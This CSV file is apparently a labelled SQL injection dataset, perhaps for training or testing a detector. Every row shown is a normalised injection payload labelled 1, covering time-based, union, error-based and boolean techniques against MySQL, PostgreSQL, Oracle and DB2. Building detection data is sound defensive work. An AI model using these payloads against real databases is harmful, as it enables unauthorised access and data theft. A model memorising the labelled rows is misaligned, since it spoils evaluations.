row_index,payload_norm,label,sqli_type_hint
2550,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( 'wusq' = 'wusq",1,
2551,"1%"" ) order by 1#",1,
2552,"1"" ) as zopq where 2680 = 2680",1,
2553,"-8844"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
2554,"1 ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 4666 = 4666",1,
2555,1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'ukoc' like 'ukoc,1,
2556,"-4222' ) union all select 9267,9267,9267,9267,9267,9267--",1,
2557,"-2375 union all select 1573,1573,1573,1573#",1,
2558,"1' ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
2559,1' ) ) as yqcl where 5026 = 5026 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,1,
2560,"-6803"" ) order by 1#",1,
2561,"select * from generate_series ( 9709,9709,case when ( 9709 = 7795 ) then 1 else 0 end ) limit 1--",1,
2562,"-7409"" ) ) union all select 3145,3145,3145--",1,
2563,"-4926"" where 8152 = 8152 or 4339 = 5547#",1,
2564,select case when 7951 = 1147 then 1 else null end--,1,
2565,"select sleep ( 5 ) and ( ""tlbp"" = ""tlbp",1,
2566,"1 union all select null,null,null#",1,
2567,"1"" ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""frgb"" like ""frgb",1,
2568,"1"" ) ) as tfjh where 1134 = 1134 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
2569,1' ) ) as qqvk where 1007 = 1007,1,
2570,"( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6130 = 6130,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,
2571,-2050' union all select 5606#,1,
2572,-7199' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'qibr' = 'qibr,1,
2573,"-2256"" ) ) ) or 1971 = 4537#",1,
2574,"1%"" ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
2575,"1 ) ) as nlzg where 1482 = 1482 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",1,
2576,1' where 2673 = 2673,1,
2577,"1"" ) where 2602 = 2602 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
2578,"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",1,
2579,"1"" ) ) and ( 3020 = 3020 ) *6703 and ( ( ""bely"" = ""bely",1,
